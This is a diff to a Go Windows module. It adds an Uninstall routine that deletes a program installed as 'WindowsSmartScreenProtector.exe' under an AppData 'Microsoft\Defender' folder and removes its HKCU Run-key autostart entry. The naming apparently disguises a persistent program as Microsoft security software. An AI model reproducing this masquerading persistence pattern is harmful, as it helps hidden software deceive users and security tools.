@@ -5,7 +5,28 @@ import (
 	"golang.org/x/sys/windows/registry"
 	"io"
 	"os"
+	"strings"
 )
+
+func Uninstall() (bool, error) {
+	appdata := os.Getenv("APPDATA")
+	filePath := fmt.Sprintf("%v\\%v", appdata, "Microsoft\\Defender\\WindowsSmartScreenProtector.exe")
+	dir, _ := SplitPath(filePath)
+	err := os.RemoveAll(dir)
+	if err != nil {
+		return false, err
+	}
+	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
+	if err != nil {
+		return false, err
+	}
+	defer k.Close()
+	err = k.DeleteValue("MicrosoftSmartScreenProtector")
+	if err != nil {
+		return false, err
+	}
+	return true, nil
+}
 
 func Install(programPath string) (bool, error) {
 	appdata := os.Getenv("APPDATA")
@@ -66,4 +87,9 @@ func createPathIfNotExist(path string) (err error) {
 		return nil
 	}
 	return nil
+}
+
+func SplitPath(path string) (dir, file string) {
+	i := strings.LastIndex(path, "\\")
+	return path[:i+1], path[i+1:]
 }
